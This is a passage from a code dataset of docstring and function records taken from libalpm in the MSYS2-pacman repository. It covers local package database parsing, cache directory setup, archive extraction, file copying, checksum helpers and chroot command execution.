(alpm_pkgreason_t)atoi(line);\n\t\t\t} else if(strcmp(line, \"%VALIDATION%\") == 0) {\n\t\t\t\talpm_list_t *i, *v = NULL;\n\t\t\t\tREAD_AND_STORE_ALL(v);\n\t\t\t\tfor(i = v; i; i = alpm_list_next(i))\n\t\t\t\t{\n\t\t\t\t\tif(strcmp(i->data, \"none\") == 0) {\n\t\t\t\t\t\tinfo->validation |= ALPM_PKG_VALIDATION_NONE;\n\t\t\t\t\t} else if(strcmp(i->data, \"md5\") == 0) {\n\t\t\t\t\t\tinfo->validation |= ALPM_PKG_VALIDATION_MD5SUM;\n\t\t\t\t\t} else if(strcmp(i->data, \"sha256\") == 0) {\n\t\t\t\t\t\tinfo->validation |= ALPM_PKG_VALIDATION_SHA256SUM;\n\t\t\t\t\t} else if(strcmp(i->data, \"pgp\") == 0) {\n\t\t\t\t\t\tinfo->validation |= ALPM_PKG_VALIDATION_SIGNATURE;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t_alpm_log(db->handle, ALPM_LOG_WARNING,\n\t\t\t\t\t\t\t\t_(\"unknown validation type for package %s: %s\\n\"),\n\t\t\t\t\t\t\t\tinfo->name, (const char *)i->data);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tFREELIST(v);\n\t\t\t} else if(strcmp(line, \"%SIZE%\") == 0) {\n\t\t\t\tREAD_NEXT();\n\t\t\t\tinfo->isize = _alpm_strtoofft(line);\n\t\t\t} else if(strcmp(line, \"%REPLACES%\") == 0) {\n\t\t\t\tREAD_AND_SPLITDEP(info->replaces);\n\t\t\t} else if(strcmp(line, \"%DEPENDS%\") == 0) {\n\t\t\t\tREAD_AND_SPLITDEP(info->depends);\n\t\t\t} else if(strcmp(line, \"%OPTDEPENDS%\") == 0) {\n\t\t\t\tREAD_AND_SPLITDEP(info->optdepends);\n\t\t\t} else if(strcmp(line, \"%CONFLICTS%\") == 0) {\n\t\t\t\tREAD_AND_SPLITDEP(info->conflicts);\n\t\t\t} else if(strcmp(line, \"%PROVIDES%\") == 0) {\n\t\t\t\tREAD_AND_SPLITDEP(info->provides);\n\t\t\t}\n\t\t}\n\t\tfclose(fp);\n\t\tfp = NULL;\n\t\tinfo->infolevel |= INFRQ_DESC;\n\t}\n\n\t/* FILES */\n\tif(inforeq & INFRQ_FILES && !(info->infolevel & INFRQ_FILES)) {\n\t\tchar *path = _alpm_local_db_pkgpath(db, info, \"files\");\n\t\tif(!path || (fp = fopen(path, \"r\")) == NULL) {\n\t\t\t_alpm_log(db->handle, ALPM_LOG_ERROR, _(\"could not open file %s: %s\\n\"), path, strerror(errno));\n\t\t\tfree(path);\n\t\t\tgoto error;\n\t\t}\n\t\tfree(path);\n\t\twhile(safe_fgets(line, sizeof(line), fp)) {\n\t\t\t_alpm_strip_newline(line, 0);\n\t\t\tif(strcmp(line, \"%FILES%\") == 0) {\n\t\t\t\tsize_t files_count = 0, files_size = 0, len;\n\t\t\t\talpm_file_t *files = NULL;\n\n\t\t\t\twhile(safe_fgets(line, sizeof(line), fp) &&\n\t\t\t\t\t\t(len = _alpm_strip_newline(line, 0))) {\n\t\t\t\t\tif(!_alpm_greedy_grow((void **)&files, &files_size,\n\t\t\t\t\t\t\t\t(files_count ? (files_count + 1) * sizeof(alpm_file_t) : 8 * sizeof(alpm_file_t)))) {\n\t\t\t\t\t\tgoto error;\n\t\t\t\t\t}\n\t\t\t\t\t/* since we know the length of the file string already,\n\t\t\t\t\t * we can do malloc + memcpy rather than strdup */\n\t\t\t\t\tlen += 1;\n\t\t\t\t\tMALLOC(files[files_count].name, len, goto error);\n\t\t\t\t\tmemcpy(files[files_count].name, line, len);\n\t\t\t\t\tfiles_count++;\n\t\t\t\t}\n\t\t\t\t/* attempt to hand back any memory we don't need */\n\t\t\t\tif(files_count > 0) {\n\t\t\t\t\tfiles = realloc(files, sizeof(alpm_file_t) * files_count);\n\t\t\t\t\t/* make sure the list is sorted */\n\t\t\t\t\tqsort(files, files_count, sizeof(alpm_file_t), _alpm_files_cmp);\n\t\t\t\t} else {\n\t\t\t\t\tFREE(files);\n\t\t\t\t}\n\t\t\t\tinfo->files.count = files_count;\n\t\t\t\tinfo->files.files = files;\n\t\t\t} else if(strcmp(line, \"%BACKUP%\") == 0) {\n\t\t\t\twhile(safe_fgets(line, sizeof(line), fp) && _alpm_strip_newline(line, 0)) {\n\t\t\t\t\talpm_backup_t *backup;\n\t\t\t\t\tCALLOC(backup, 1, sizeof(alpm_backup_t), goto error);\n\t\t\t\t\tif(_alpm_split_backup(line, &backup)) {\n\t\t\t\t\t\tFREE(backup);\n\t\t\t\t\t\tgoto error;\n\t\t\t\t\t}\n\t\t\t\t\tinfo->backup = alpm_list_add(info->backup, backup);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tfclose(fp);\n\t\tfp = NULL;\n\t\tinfo->infolevel |= INFRQ_FILES;\n\t}\n\n\t/* INSTALL */\n\tif(inforeq & INFRQ_SCRIPTLET && !(info->infolevel & INFRQ_SCRIPTLET)) {\n\t\tchar *path = _alpm_local_db_pkgpath(db, info, \"install\");\n\t\tif(access(path, F_OK) == 0) {\n\t\t\tinfo->scriptlet = 1;\n\t\t}\n\t\tfree(path);\n\t\tinfo->infolevel |= INFRQ_SCRIPTLET;\n\t}\n\n\treturn 0;\n\nerror:\n\tinfo->infolevel |= INFRQ_ERROR;\n\tif(fp) {\n\t\tfclose(fp);\n\t}\n\treturn -1;\n}", "path": "lib\\libalpm\\be_local.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Check the alpm cachedirs for existence and find a writable one.\n * If no valid cache directory can be found, use /tmp.\n * @param handle the context handle\n * @return pointer to a writable cache directory.\n */\n", "func_signal": "const char *_alpm_filecache_setup(alpm_handle_t *handle)", "code": "{\n\tstruct stat buf;\n\talpm_list_t *i;\n\tchar *cachedir;\n\tconst char *tmpdir;\n\n\t/* Loop through the cache dirs until we find a usable directory */\n\tfor(i = handle->cachedirs; i; i = i->next) {\n\t\tcachedir = i->data;\n\t\tif(stat(cachedir, &buf) != 0) {\n\t\t\t/* cache directory does not exist.... try creating it */\n\t\t\t_alpm_log(handle, ALPM_LOG_WARNING, _(\"no %s cache exists, creating...\\n\"),\n\t\t\t\t\tcachedir);\n\t\t\tif(_alpm_makepath(cachedir) == 0) {\n\t\t\t\t_alpm_log(handle, ALPM_LOG_DEBUG, \"using cachedir: %s\\n\", cachedir);\n\t\t\t\treturn cachedir;\n\t\t\t}\n\t\t} else if(!S_ISDIR(buf.st_mode)) {\n\t\t\t_alpm_log(handle, ALPM_LOG_DEBUG,\n\t\t\t\t\t\"skipping cachedir, not a directory: %s\\n\", cachedir);\n\t\t} else if(_alpm_access(handle, NULL, cachedir, W_OK) != 0) {\n\t\t\t_alpm_log(handle, ALPM_LOG_DEBUG,\n\t\t\t\t\t\"skipping cachedir, not writable: %s\\n\", cachedir);\n\t\t} else if(!(buf.st_mode & (S_IWUSR | S_IWGRP | S_IWOTH))) {\n\t\t\t_alpm_log(handle, ALPM_LOG_DEBUG,\n\t\t\t\t\t\"skipping cachedir, no write bits set: %s\\n\", cachedir);\n\t\t} else {\n\t\t\t_alpm_log(handle, ALPM_LOG_DEBUG, \"using cachedir: %s\\n\", cachedir);\n\t\t\treturn cachedir;\n\t\t}\n\t}\n\n\t/* we didn't find a valid cache directory. use TMPDIR or /tmp. */\n\tif((tmpdir = getenv(\"TMPDIR\")) && stat(tmpdir, &buf) && S_ISDIR(buf.st_mode)) {\n\t\t/* TMPDIR was good, we can use it */\n\t} else {\n\t\ttmpdir = \"/tmp\";\n\t}\n\talpm_option_add_cachedir(handle, tmpdir);\n\tcachedir = handle->cachedirs->prev->data;\n\t_alpm_log(handle, ALPM_LOG_DEBUG, \"using cachedir: %s\\n\", cachedir);\n\t_alpm_log(handle, ALPM_LOG_WARNING,\n\t\t\t_(\"couldn't find or create package cache, using %s instead\\n\"), cachedir);\n\treturn cachedir;\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Unpack a list of files in an archive.\n * @param handle the context handle\n * @param path the archive to unpack\n * @param prefix where to extract the files\n * @param list a list of files within the archive to unpack or NULL for all\n * @param breakfirst break after the first entry found\n * @return 0 on success, 1 on failure\n */\n", "func_signal": "int _alpm_unpack(alpm_handle_t *handle, const char *path, const char *prefix,\n\t\talpm_list_t *list, int breakfirst)", "code": "{\n\tint ret = 0;\n\tmode_t oldmask;\n\tstruct archive *archive;\n\tstruct archive_entry *entry;\n\tstruct stat buf;\n\tint fd, cwdfd;\n\n\tfd = _alpm_open_archive(handle, path, &buf, &archive, ALPM_ERR_PKG_OPEN);\n\tif(fd < 0) {\n\t\treturn 1;\n\t}\n\n\toldmask = umask(0022);\n\n\t/* save the cwd so we can restore it later */\n\tOPEN(cwdfd, \".\", O_RDONLY | O_CLOEXEC);\n\tif(cwdfd < 0) {\n\t\t_alpm_log(handle, ALPM_LOG_ERROR, _(\"could not get current working directory\\n\"));\n\t}\n\n\t/* just in case our cwd was removed in the upgrade operation */\n\tif(chdir(prefix) != 0) {\n\t\t_alpm_log(handle, ALPM_LOG_ERROR, _(\"could not change directory to %s (%s)\\n\"),\n\t\t\t\tprefix, strerror(errno));\n\t\tret = 1;\n\t\tgoto cleanup;\n\t}\n\n\twhile(archive_read_next_header(archive, &entry) == ARCHIVE_OK) {\n\t\tconst char *entryname;\n\t\tmode_t mode;\n\n\t\tentryname = archive_entry_pathname(entry);\n\n\t\t/* If specific files were requested, skip entries that don't match. */\n\t\tif(list) {\n\t\t\tchar *entry_prefix = strdup(entryname);\n\t\t\tchar *p = strstr(entry_prefix,\"/\");\n\t\t\tif(p) {\n\t\t\t\t*(p + 1) = '\\0';\n\t\t\t}\n\t\t\tchar *found = alpm_list_find_str(list, entry_prefix);\n\t\t\tfree(entry_prefix);\n\t\t\tif(!found) {\n\t\t\t\tif(archive_read_data_skip(archive) != ARCHIVE_OK) {\n\t\t\t\t\tret = 1;\n\t\t\t\t\tgoto cleanup;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t} else {\n\t\t\t\t_alpm_log(handle, ALPM_LOG_DEBUG, \"extracting: %s\\n\", entryname);\n\t\t\t}\n\t\t}\n\n\t\tmode = archive_entry_mode(entry);\n\t\tif(S_ISREG(mode)) {\n\t\t\tarchive_entry_set_perm(entry, 0644);\n\t\t} else if(S_ISDIR(mode)) {\n\t\t\tarchive_entry_set_perm(entry, 0755);\n\t\t}\n\n\t\t/* Extract the archive entry. */\n\t\tint readret = archive_read_extract(archive, entry, 0);\n\t\tif(readret == ARCHIVE_WARN) {\n\t\t\t/* operation succeeded but a non-critical error was encountered */\n\t\t\t_alpm_log(handle, ALPM_LOG_WARNING, _(\"warning given when extracting %s (%s)\\n\"),\n\t\t\t\t\tentryname, archive_error_string(archive));\n\t\t} else if(readret != ARCHIVE_OK) {\n\t\t\t_alpm_log(handle, ALPM_LOG_ERROR, _(\"could not extract %s (%s)\\n\"),\n\t\t\t\t\tentryname, archive_error_string(archive));\n\t\t\tret = 1;\n\t\t\tgoto cleanup;\n\t\t}\n\n\t\tif(breakfirst) {\n\t\t\tbreak;\n\t\t}\n\t}\n\ncleanup:\n\tumask(oldmask);\n\t_alpm_archive_read_free(archive);\n\tclose(fd);\n\tif(cwdfd >= 0) {\n\t\tif(fchdir(cwdfd) != 0) {\n\t\t\t_alpm_log(handle, ALPM_LOG_ERROR,\n\t\t\t\t\t_(\"could not restore working directory (%s)\\n\"), strerror(errno));\n\t\t}\n\t\tclose(cwdfd);\n\t}\n\n\treturn ret;\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Wrapper around access() which takes a dir and file argument\n * separately and generates an appropriate error message.\n * If dir is NULL file will be treated as the whole path.\n * @param handle an alpm handle\n * @param dir directory path ending with and slash\n * @param file filename\n * @param amode access mode as described in access()\n * @return int value returned by access()\n */\n", "func_signal": "int _alpm_access(alpm_handle_t *handle, const char *dir, const char *file, int amode)", "code": "{\n\tsize_t len = 0;\n\tint ret = 0;\n\n\tif(dir) {\n\t\tchar *check_path;\n\n\t\tlen = strlen(dir) + strlen(file) + 1;\n\t\tCALLOC(check_path, len, sizeof(char), RET_ERR(handle, ALPM_ERR_MEMORY, -1));\n\t\tsnprintf(check_path, len, \"%s%s\", dir, file);\n\n\t\tret = access(check_path, amode);\n\t\tfree(check_path);\n\t} else {\n\t\tdir = \"\";\n\t\tret = access(file, amode);\n\t}\n\n\tif(ret != 0) {\n\t\tif(amode & R_OK) {\n\t\t\t_alpm_log(handle, ALPM_LOG_DEBUG, \"\\\"%s%s\\\" is not readable: %s\\n\",\n\t\t\t\t\tdir, file, strerror(errno));\n\t\t}\n\t\tif(amode & W_OK) {\n\t\t\t_alpm_log(handle, ALPM_LOG_DEBUG, \"\\\"%s%s\\\" is not writable: %s\\n\",\n\t\t\t\t\tdir, file, strerror(errno));\n\t\t}\n\t\tif(amode & X_OK) {\n\t\t\t_alpm_log(handle, ALPM_LOG_DEBUG, \"\\\"%s%s\\\" is not executable: %s\\n\",\n\t\t\t\t\tdir, file, strerror(errno));\n\t\t}\n\t\tif(amode == F_OK) {\n\t\t\t_alpm_log(handle, ALPM_LOG_DEBUG, \"\\\"%s%s\\\" does not exist: %s\\n\",\n\t\t\t\t\tdir, file, strerror(errno));\n\t\t}\n\t}\n\treturn ret;\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Copies a file.\n * @param src file path to copy from\n * @param dest file path to copy to\n * @return 0 on success, 1 on error\n */\n", "func_signal": "int _alpm_copyfile(const char *src, const char *dest)", "code": "{\n\tchar *buf;\n\tint in, out, ret = 1;\n\tssize_t nread;\n\tstruct stat st;\n\n\tMALLOC(buf, (size_t)ALPM_BUFFER_SIZE, return 1);\n\n\tOPEN(in, src, O_RDONLY | O_CLOEXEC);\n\tdo {\n\t\tout = open(dest, O_WRONLY | O_CREAT | O_BINARY | O_CLOEXEC, 0000);\n\t} while(out == -1 && errno == EINTR);\n\tif(in < 0 || out < 0) {\n\t\tgoto cleanup;\n\t}\n\n\tif(fstat(in, &st) || fchmod(out, st.st_mode)) {\n\t\tgoto cleanup;\n\t}\n\n\t/* do the actual file copy */\n\twhile((nread = read(in, buf, ALPM_BUFFER_SIZE)) > 0 || errno == EINTR) {\n\t\tssize_t nwrite = 0;\n\t\tif(nread < 0) {\n\t\t\tcontinue;\n\t\t}\n\t\tdo {\n\t\t\tnwrite = write(out, buf + nwrite, nread);\n\t\t\tif(nwrite >= 0) {\n\t\t\t\tnread -= nwrite;\n\t\t\t} else if(errno != EINTR) {\n\t\t\t\tgoto cleanup;\n\t\t\t}\n\t\t} while(nread > 0);\n\t}\n\tret = 0;\n\ncleanup:\n\tfree(buf);\n\tif(in >= 0) {\n\t\tclose(in);\n\t}\n\tif(out >= 0) {\n\t\tclose(out);\n\t}\n\treturn ret;\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Create a string representing bytes in hexadecimal.\n * @param bytes the bytes to represent in hexadecimal\n * @param size number of bytes to consider\n * @return a NULL terminated string with the hexadecimal representation of\n * bytes or NULL on error. This string must be freed.\n */\n", "func_signal": "static char *hex_representation(unsigned char *bytes, size_t size)", "code": "{\n\tstatic const char *hex_digits = \"0123456789abcdef\";\n\tchar *str;\n\tsize_t i;\n\n\tMALLOC(str, 2 * size + 1, return NULL);\n\n\tfor(i = 0; i < size; i++) {\n\t\tstr[2 * i] = hex_digits[bytes[i] >> 4];\n\t\tstr[2 * i + 1] = hex_digits[bytes[i] & 0x0f];\n\t}\n\n\tstr[2 * size] = '\\0';\n\n\treturn str;\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Get the sha256 sum of file.\n * @param filename name of the file\n * @return the checksum on success, NULL on error\n * @addtogroup alpm_misc\n */\n", "func_signal": "char SYMEXPORT *alpm_compute_sha256sum(const char *filename)", "code": "{\n\tunsigned char output[32];\n\n\tASSERT(filename != NULL, return NULL);\n\n\t/* defined above for OpenSSL, otherwise defined in sha2.h */\n\tif(sha2_file(filename, output, 0) > 0) {\n\t\treturn NULL;\n\t}\n\n\treturn hex_representation(output, 32);\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/* Note: the return value must be freed by the caller */\n", "func_signal": "char *_alpm_local_db_pkgpath(alpm_db_t *db, alpm_pkg_t *info,\n\t\tconst char *filename)", "code": "{\n\tsize_t len;\n\tchar *pkgpath;\n\tconst char *dbpath;\n\n\tdbpath = _alpm_db_path(db);\n\tlen = strlen(dbpath) + strlen(info->name) + strlen(info->version) + 3;\n\tlen += filename ? strlen(filename) : 0;\n\tMALLOC(pkgpath, len, RET_ERR(db->handle, ALPM_ERR_MEMORY, NULL));\n\tsprintf(pkgpath, \"%s%s-%s/%s\", dbpath, info->name, info->version,\n\t\t\tfilename ? filename : \"\");\n\treturn pkgpath;\n}", "path": "lib\\libalpm\\be_local.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/* Note: does NOT handle sparse files on purpose for speed. */\n/** TODO.\n * Does not handle sparse files on purpose for speed.\n * @param a\n * @param b\n * @return\n */\n", "func_signal": "int _alpm_archive_fgets(struct archive *a, struct archive_read_buffer *b)", "code": "{\n\t/* ensure we start populating our line buffer at the beginning */\n\tb->line_offset = b->line;\n\n\twhile(1) {\n\t\tsize_t block_remaining;\n\t\tchar *eol;\n\n\t\t/* have we processed this entire block? */\n\t\tif(b->block + b->block_size == b->block_offset) {\n\t\t\tint64_t offset;\n\t\t\tif(b->ret == ARCHIVE_EOF) {\n\t\t\t\t/* reached end of archive on the last read, now we are out of data */\n\t\t\t\tgoto cleanup;\n\t\t\t}\n\n\t\t\t/* zero-copy - this is the entire next block of data. */\n\t\t\tb->ret = archive_read_data_block(a, (void *)&b->block,\n\t\t\t\t\t&b->block_size, &offset);\n\t\t\tb->block_offset = b->block;\n\t\t\tblock_remaining = b->block_size;\n\n\t\t\t/* error, cleanup */\n\t\t\tif(b->ret < ARCHIVE_OK) {\n\t\t\t\tgoto cleanup;\n\t\t\t}\n\t\t} else {\n\t\t\tblock_remaining = b->block + b->block_size - b->block_offset;\n\t\t}\n\n\t\t/* look through the block looking for EOL characters */\n\t\teol = memchr(b->block_offset, '\\n', block_remaining);\n\t\tif(!eol) {\n\t\t\teol = memchr(b->block_offset, '\\0', block_remaining);\n\t\t}\n\n\t\t/* allocate our buffer, or ensure our existing one is big enough */\n\t\tif(!b->line) {\n\t\t\t/* set the initial buffer to the read block_size */\n\t\t\tCALLOC(b->line, b->block_size + 1, sizeof(char), b->ret = -ENOMEM; goto cleanup);\n\t\t\tb->line_size = b->block_size + 1;\n\t\t\tb->line_offset = b->line;\n\t\t} else {\n\t\t\t/* note: we know eol > b->block_offset and b->line_offset > b->line,\n\t\t\t * so we know the result is unsigned and can fit in size_t */\n\t\t\tsize_t new = eol ? (size_t)(eol - b->block_offset) : block_remaining;\n\t\t\tsize_t needed = (size_t)((b->line_offset - b->line) + new + 1);\n\t\t\tif(needed > b->max_line_size) {\n\t\t\t\tb->ret = -ERANGE;\n\t\t\t\tgoto cleanup;\n\t\t\t}\n\t\t\tif(needed > b->line_size) {\n\t\t\t\t/* need to realloc + copy data to fit total length */\n\t\t\t\tchar *new_line;\n\t\t\t\tCALLOC(new_line, needed, sizeof(char), b->ret = -ENOMEM; goto cleanup);\n\t\t\t\tmemcpy(new_line, b->line, b->line_size);\n\t\t\t\tb->line_size = needed;\n\t\t\t\tb->line_offset = new_line + (b->line_offset - b->line);\n\t\t\t\tfree(b->line);\n\t\t\t\tb->line = new_line;\n\t\t\t}\n\t\t}\n\n\t\tif(eol) {\n\t\t\tsize_t len = (size_t)(eol - b->block_offset);\n\t\t\tmemcpy(b->line_offset, b->block_offset, len);\n\t\t\tb->line_offset[len] = '\\0';\n\t\t\tb->block_offset = eol + 1;\n\t\t\tb->real_line_size = b->line_offset + len - b->line;\n\t\t\t/* this is the main return point; from here you can read b->line */\n\t\t\treturn ARCHIVE_OK;\n\t\t} else {\n\t\t\t/* we've looked through the whole block but no newline, copy it */\n\t\t\tsize_t len = (size_t)(b->block + b->block_size - b->block_offset);\n\t\t\tmemcpy(b->line_offset, b->block_offset, len);\n\t\t\tb->line_offset += len;\n\t\t\tb->block_offset = b->block + b->block_size;\n\t\t\t/* there was no new data, return what is left; saved ARCHIVE_EOF will be\n\t\t\t * returned on next call */\n\t\t\tif(len == 0) {\n\t\t\t\tb->line_offset[0] = '\\0';\n\t\t\t\tb->real_line_size = b->line_offset - b->line;\n\t\t\t\treturn ARCHIVE_OK;\n\t\t\t}\n\t\t}\n\t}\n\ncleanup:\n\t{\n\t\tint ret = b->ret;\n\t\tFREE(b->line);\n\t\tmemset(b, 0, sizeof(struct archive_read_buffer));\n\t\treturn ret;\n\t}\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Get the md5 sum of file.\n * @param filename name of the file\n * @return the checksum on success, NULL on error\n * @addtogroup alpm_misc\n */\n", "func_signal": "char SYMEXPORT *alpm_compute_md5sum(const char *filename)", "code": "{\n\tunsigned char output[16];\n\n\tASSERT(filename != NULL, return NULL);\n\n\t/* defined above for OpenSSL, otherwise defined in md5.h */\n\tif(md5_file(filename, output) > 0) {\n\t\treturn NULL;\n\t}\n\n\treturn hex_representation(output, 16);\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Execute a command with arguments in a chroot.\n * @param handle the context handle\n * @param cmd command to execute\n * @param argv arguments to pass to cmd\n * @param stdin_cb callback to provide input to the chroot on stdin\n * @param stdin_ctx context to be passed to @a stdin_cb\n * @return 0 on success, 1 on error\n */\n", "func_signal": "int _alpm_run_chroot(alpm_handle_t *handle, const char *cmd, char *const argv[],\n\t\t_alpm_cb_io stdin_cb, void *stdin_ctx)", "code": "{\n\tpid_t pid;\n\tint child2parent_pipefd[2], parent2child_pipefd[2];\n\tint cwdfd;\n\tint retval = 0;\n\n\t/* save the cwd so we can restore it later */\n\tOPEN(cwdfd, \".\", O_RDONLY | O_CLOEXEC);\n\tif(cwdfd < 0) {\n\t\t_alpm_log(handle, ALPM_LOG_ERROR, _(\"could not get current working directory\\n\"));\n\t}\n\n\t/* just in case our cwd was removed in the upgrade operation */\n\tif(chdir(handle->root) != 0) {\n\t\t_alpm_log(handle, ALPM_LOG_ERROR, _(\"could not change directory to %s (%s)\\n\"),\n\t\t\t\thandle->root, strerror(errno));\n\t\tgoto cleanup;\n\t}\n\n\t_alpm_log(handle, ALPM_LOG_DEBUG, \"executing \\\"%s\\\" under chroot \\\"%s\\\"\\n\",\n\t\t\tcmd, handle->root);\n\n\t/* Flush open fds before fork() to avoid cloning buffers */\n\tfflush(NULL);\n\n\tif(pipe(child2parent_pipefd) == -1) {\n\t\t_alpm_log(handle, ALPM_LOG_ERROR, _(\"could not create pipe (%s)\\n\"), strerror(errno));\n\t\tretval = 1;\n\t\tgoto cleanup;\n\t}\n\n\tif(pipe(parent2child_pipefd) == -1) {\n\t\t_alpm_log(handle, ALPM_LOG_ERROR, _(\"could not create pipe (%s)\\n\"), strerror(errno));\n\t\tretval = 1;\n\t\tgoto cleanup;\n\t}\n\n\t/* fork- parent and child each have separate code blocks below */\n\tpid = fork();\n\tif(pid == -1) {\n\t\t_alpm_log(handle, ALPM_LOG_ERROR, _(\"could not fork a new process (%s)\\n\"), strerror(errno));\n\t\tretval = 1;\n\t\tgoto cleanup;\n\t}\n\n\tif(pid == 0) {\n\t\t/* this code runs for the child only (the actual chroot/exec) */\n\t\tclose(0);\n\t\tclose(1);\n\t\tclose(2);\n\t\twhile(dup2(child2parent_pipefd[1], 1) == -1 && errno == EINTR);\n\t\twhile(dup2(child2parent_pipefd[1], 2) == -1 && errno == EINTR);\n\t\twhile(dup2(parent2child_pipefd[0], 0) == -1 && errno == EINTR);\n\t\tclose(parent2child_pipefd[0]);\n\t\tclose(parent2child_pipefd[1]);\n\t\tclose(child2parent_pipefd[0]);\n\t\tclose(child2parent_pipefd[1]);\n\t\tif(cwdfd >= 0) {\n\t\t\tclose(cwdfd);\n\t\t}\n\n\t\t/* use fprintf instead of _alpm_log to send output through the parent */\n\t\tif(chroot(handle->root) != 0) {\n\t\t\tfprintf(stderr, _(\"could not change the root directory (%s)\\n\"), strerror(errno));\n\t\t\texit(1);\n\t\t}\n\t\tif(chdir(\"/\") != 0) {\n\t\t\tfprintf(stderr, _(\"could not change directory to %s (%s)\\n\"),\n\t\t\t\t\t\"/\", strerror(errno));\n\t\t\texit(1);\n\t\t}\n\t\tumask(0022);\n\t\texecv(cmd, argv);\n\t\t/* execv only returns if there was an error */\n\t\tfprintf(stderr, _(\"call to execv failed (%s)\\n\"), strerror(errno));\n\t\texit(1);\n\t} else {\n\t\t/* this code runs for the parent only (wait on the child) */\n\t\tint status;\n\t\tchar obuf[PIPE_BUF]; /* writes <= PIPE_BUF are guaranteed atomic */\n\t\tchar ibuf[LINE_MAX];\n\t\tssize_t olen = 0, ilen = 0;\n\t\tnfds_t nfds = 2;\n\t\tstruct pollfd fds[2], *child2parent = &(fds[0]), *parent2child = &(fds[1]);\n\n\t\tchild2parent->fd = child2parent_pipefd[0];\n\t\tchild2parent->events = POLLIN;\n\t\tfcntl(child2parent->fd, F_SETFL, O_NONBLOCK);\n\t\tclose(child2parent_pipefd[1]);\n\t\tclose(parent2child_pipefd[0]);\n\n\t\tif(stdin_cb) {\n\t\t\tparent2child->fd = parent2child_pipefd[1];\n\t\t\tparent2child->events = POLLOUT;\n\t\t\tfcntl(parent2child->fd, F_SETFL, O_NONBLOCK);\n\t\t} else {\n\t\t\tparent2child->fd = -1;\n\t\t\tparent2child->events = 0;\n\t\t\tclose(parent2child_pipefd[1]);\n\t\t}\n\n#define STOP_POLLING(p) do { close(p->fd); p->fd = -1; } while(0)\n\n\t\twhile((child2parent->fd != -1 || parent2child->fd != -1)\n\t\t\t\t&& poll(fds, nfds, -1) > 0) {\n\t\t\tif(child2parent->revents & POLLIN) {\n\t\t\t\tif(_alpm_chroot_read_from_child(handle, child2parent->fd,\n\t\t\t\t\t\t\tibuf, &ilen, sizeof(ibuf)) != 0) {\n\t\t\t\t\t/* we encountered end-of-file or an error */\n\t\t\t\t\tSTOP_POLLING(child2parent);\n\t\t\t\t}\n\t\t\t} else if(child2parent->revents) {\n\t\t\t\t/* anything but POLLIN indicates an error */\n\t\t\t\tSTOP_POLLING(child2parent);\n\t\t\t}\n\t\t\tif(parent2child->revents & POLLOUT) {\n\t\t\t\tif(_alpm_chroot_write_to_child(handle, parent2child->fd, obuf, &olen,\n\t\t\t\t\t\t\tsizeof(obuf), stdin_cb, stdin_ctx) != 0) {\n\t\t\t\t\tSTOP_POLLING(parent2child);\n\t\t\t\t}\n\t\t\t} else if(parent2child->revents) {\n\t\t\t\t/* anything but POLLOUT indicates an error */\n\t\t\t\tSTOP_POLLING(parent2child);\n\t\t\t}\n\t\t}\n\t\t/* process anything left in the input buffer */\n\t\tif(ilen) {\n\t\t\t/* buffer would have already been flushed if it had a newline */\n\t\t\tstrcpy(ibuf + ilen, \"\\n\");\n\t\t\t_alpm_chroot_process_output(handle, ibuf);\n\t\t}\n\n#undef STOP_POLLING\n\n\t\tif(parent2child->fd != -1) {\n\t\t\tclose(parent2child->fd);\n\t\t}\n\t\tif(child2parent->fd != -1) {\n\t\t\tclose(child2parent->fd);\n\t\t}\n\n\t\twhile(waitpid(pid, &status, 0) == -1) {\n\t\t\tif(errno != EINTR) {\n\t\t\t\t_alpm_log(handle, ALPM_LOG_ERROR, _(\"call to waitpid failed (%s)\\n\"), strerror(errno));\n\t\t\t\tretval = 1;\n\t\t\t\tgoto cleanup;\n\t\t\t}\n\t\t}\n\n\t\t/* check the return status, make sure it is 0 (success) */\n\t\tif(WIFEXITED(status)) {\n\t\t\t_alpm_log(handle, ALPM_LOG_DEBUG, \"call to waitpid succeeded\\n\");\n\t\t\tif(WEXITSTATUS(status) != 0) {\n\t\t\t\t_alpm_log(handle, ALPM_LOG_ERROR, _(\"command failed to execute correctly\\n\"));\n\t\t\t\tretval = 1;\n\t\t\t}\n\t\t} else if(WIFSIGNALED(status) != 0) {\n\t\t\tchar *signal_description = strsignal(WTERMSIG(status));\n\t\t\t/* strsignal can return NULL on some (non-Linux) platforms */\n\t\t\tif(signal_description == NULL) {\n\t\t\t\tsignal_description = _(\"Unknown signal\");\n\t\t\t}\n\t\t\t_alpm_log(handle, ALPM_LOG_ERROR, _(\"command terminated by signal %d: %s\\n\"),\n\t\t\t\t\t\tWTERMSIG(status), signal_description);\n\t\t\tretval = 1;\n\t\t}\n\t}\n\ncleanup:\n\tif(cwdfd >= 0) {\n\t\tif(fchdir(cwdfd) != 0) {\n\t\t\t_alpm_log(handle, 